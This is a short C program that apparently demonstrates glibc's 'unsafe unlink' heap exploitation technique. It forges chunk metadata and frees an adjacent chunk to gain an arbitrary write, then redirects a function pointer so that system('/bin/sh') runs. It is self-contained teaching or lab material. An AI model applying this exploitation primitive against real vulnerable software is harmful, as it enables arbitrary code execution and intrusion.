#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef void (*dn)();

uint64_t *chunk0_ptr;

void doNothing()
{
	printf("nothing\n");
}
void shell()
{
  system("/bin/sh");
}

int main()
{

	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
	int header_size = 2;


	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	chunk1_hdr[0] = malloc_size;
	chunk1_hdr[1] &= ~1;

	free(chunk1_ptr);

	dn d = doNothing;

	chunk0_ptr[3] = (uint64_t) &d;
	chunk0_ptr[0] = (uint64_t) &shell;

	(*d)();

}